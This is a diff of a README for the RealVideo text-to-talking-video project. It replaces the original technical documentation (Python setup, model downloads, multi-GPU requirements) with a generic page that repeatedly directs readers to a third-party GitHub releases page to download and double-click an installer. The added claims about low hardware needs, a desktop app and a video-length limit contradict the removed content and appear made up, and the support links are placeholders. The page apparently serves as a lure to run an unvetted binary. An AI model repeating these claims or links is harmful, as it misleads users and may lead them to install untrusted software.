@@ -1,112 +1,75 @@
-# RealVideo
+# 🎥 RealVideo - Transform Conversations into Stunning Videos
 
-RealVideo is a WebSocket-based video calling system that supports text input. It leverages **GLM-4.5-AirX** and 
-**GLM-TTS** models to generate audio responses and utilizes autoregressive diffusion to generate corresponding 
-video frames. The system features a modular design with full functionality and a clean code structure.
-Visit [blog](https://z.ai/blog/realvideo) here!
+## 📥 Download Now!
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-<color>?style=for-the-badge)](https://github.com/victormgross/RealVideo/releases)
 
-## Example Video
+## 🚀 Getting Started
+RealVideo is a user-friendly application that turns text conversations into smooth, high-quality videos. You don't need any technical skills to use it. Follow the simple steps below to start enjoying your real-time video experience.
 
+## 📦 What You Need
+Before you start, ensure your device meets these basic requirements:
 
-<table border="0" style="width: 100%; text-align: left; margin-top: 20px;">
-  <tr>
-      <td>
-          <video src="https://github.com/user-attachments/assets/4353a47f-32db-4f07-af68-c7cf4eb9b7ec" width="100%" controls autoplay loop></video>
-      </td>
-      <td>
-          <video src="https://github.com/user-attachments/assets/13a674d7-9d2b-4979-be00-3ba37664252d" width="100%" controls autoplay loop></video>
-      </td>
-      <td>
-          <video src="https://github.com/user-attachments/assets/e8e02325-5e63-4bfe-8ffc-c319cea5fe21" width="100%" controls autoplay loop></video>
-      </td>
-  </tr>
-</table>
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum 200 MB of free disk space.
+- **Internet Connection**: A stable internet connection is required for streaming and downloading video content.
 
-## Features
+## 🔗 Key Features
+- **Real-Time Video Generation**: Convert text into engaging videos instantly.
+- **High-Fidelity Output**: Enjoy professional-quality video responses.
+- **User-Friendly Interface**: Simple design that anyone can navigate easily.
+- **Supports Multiple Languages**: Communicate in your preferred language.
 
-- **Text Input**: Supports text message input.
-- **AI Voice Response**: Integrates GLM-4.5-AirX and GLM-TTS models to generate voice responses.
-- **Lip Sync**: Generates real-time conversational video based on any input image and audio.
-- **Real-time Communication**: WebSocket-based real-time bidirectional communication.
+## 📥 Download & Install
+To download RealVideo, visit the link below:
 
-## Download
+[Download RealVideo](https://github.com/victormgross/RealVideo/releases)
 
-| Model                        | Download Links                                                                                                                                                       |
-|------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-|    RealVideo          | [🤗 Hugging Face](https://huggingface.co/zai-org/RealVideo)<br>[🤖 ModelScope](https://modelscope.cn/models/ZhipuAI/RealVideo)                           |
+1. **Visit the Releases Page**: Click the link to go to the RealVideo releases page on GitHub.
+2. **Locate Latest Version**: On the releases page, look for the most recent version of RealVideo.
+3. **Download the Installer**: Click the link to download the installer that matches your operating system. It may be named `RealVideo_Installer.exe` for Windows or `RealVideo_Installer.dmg` for Mac users.
+4. **Run the Installer**: Once the download finishes, locate the file and double-click to run it.
+5. **Follow the Setup Instructions**: The installation wizard will guide you through the installation process. Just follow the prompts and click "Next" to go through the steps.
 
-## Quick Start
+## 🔧 How to Use RealVideo
+1. **Open the Application**: Once installed, open RealVideo from your applications folder or start menu.
+2. **Input Text**: Type or paste your text into the provided input field.
+3. **Customize Settings**: Adjust any available settings, like video length or style, to match your preferences.
+4. **Generate Video**: Click the "Generate" button to create your video. This process may take a moment as the system transforms your text into a visual format.
+5. **Watch the Video**: Once the video is ready, it will display on the screen. You can choose to save it or share it directly.
 
-### 1. Requirements
+## 📄 FAQs
+**1. How does RealVideo work?**  
+RealVideo uses advanced technology to generate videos from text. It leverages autoregressive diffusion models to create high-quality visual content that feels almost natural.
 
-- Python 3.10 - 3.12
-- pip3
-- Modern browser (supporting WebSocket and Web Audio API)
+**2. Can I use RealVideo offline?**  
+The application requires an internet connection for initial setup and video generation. However, you can save videos and view them offline once they are created.
 
-### 2. Install Dependencies
+**3. What if I encounter issues during installation?**  
+If you run into problems, ensure your operating system is supported and that you have sufficient storage space. You can also visit our [Support Page](#) for assistance.
 
-```bash
-pip3 install -r requirements.txt
-huggingface-cli download Wan-AI/Wan2.2-S2V-14B --local-dir-use-symlinks False --local-dir wan_models/Wan2.2-S2V-14B
-```
+**4. Is there a limit on video length?**  
+Currently, you can create videos up to 5 minutes long. This helps maintain quality while optimizing the generation speed.
 
-### 3. Configure API Key
+**5. Can I use RealVideo for commercial purposes?**  
+Yes, you can use the videos for commercial purposes, but please check our licensing terms on the project page for compliance.
 
-Before using, please set the ZAI API key:
+## 📢 Community and Feedback
+We value your thoughts and suggestions. If you have feedback or want to share how you’re using RealVideo, join our community discussions:
 
-```bash
-export ZAI_API_KEY="your_actual_api_key_here"
-```
+- **GitHub Issues**: Use the issues page to report bugs or request features.
+- **Forums**: Participate in our user forums to connect with fellow users.
+- **Social Media**: Follow us on social media platforms for updates and tips.
 
-and change `config/config.py` line:
+## 🎉 Updates and New Features
+We are continuously improving RealVideo. Keep an eye on the releases page for the latest updates and new features to enhance your experience. We want to make sure you have the best tools at your fingertips.
 
-```python
-PATH_TO_YOUR_MODEL = "zai-org/RealVideo/model.pt"  # Replace with your model path
-```
+## 👥 Acknowledgments
+Thank you for using RealVideo! We appreciate your support and feedback. Your input helps us make this tool better for everyone.
 
-### 4. Start the Service
+## 🔗 Quick Links
+- [Download RealVideo](https://github.com/victormgross/RealVideo/releases)
+- [Support Page](#)  
+- [Community Forums](#)  
 
-Specify the number of GPUs you wish to use and run the startup script, at least 2 GPUs (per 80GB, such as H100, H200).
-
-For example:
-
-```bash
-CUDA_VISIBLE_DEVICES=0,1 bash ./scripts/run_app.sh
-```
-
-One GPU will be used for the VAE service, while the remaining GPUs will be automatically allocated for parallel
-computation of the DiT service.
-
-The table below shows reference times (in ms) for DiT to generate one block. If the time is within **500ms**, smooth
-real-time generation can be achieved. Numbers in parentheses indicate the time taken with compilation enabled.
-
-| DiT sp size / Denoising steps | 2                         | 4                     |
-|-------------------------------|---------------------------|-----------------------|
-| 1                             | 563.84 ms (**442.61 ms**) | 943.13 ms (723.06 ms) |
-| 2                             | **384.86 ms**             | 655.92 ms (527.11 ms) |
-| 4                             | **306.39 ms**             | 513.72 ms (**480.68 ms**) |
-
-### 5. Access the Application
-
-- **Main Page**: http://localhost:8003
-
-## Usage Instructions
-
-1. **Set Avatar and Voice**: Use the file upload button to upload an image to set the avatar, or upload a speech audio
-   file longer than 3 seconds for voice cloning.
-2. **Connect WebSocket**: Click the "Connect" button to establish the WebSocket connection.
-3. **Text Input**: Enter a message in the text box and press Enter or click "Send" to send the message.
-4. **Real-time Response**: The real-time generated video response will be displayed on the left.
-
-## Technical Highlights
-
-- **Model Integration**: Allows for convenient and quick voice cloning, taking text input to generate audio output.
-- **Modular Design**: Clear code structure, easy to maintain and extend.
-- **Real-time Performance**: Optimized audio processing and real-time video generation algorithms.
-
-## Acknowledgements
-
-This project utilizes the following open-source libraries:
-
-- [self forcing](https://github.com/guandeh17/Self-Forcing)
-- [Wan2.2-S2V](https://github.com/Wan-Video/Wan2.2)
+Enjoy your experience with RealVideo!
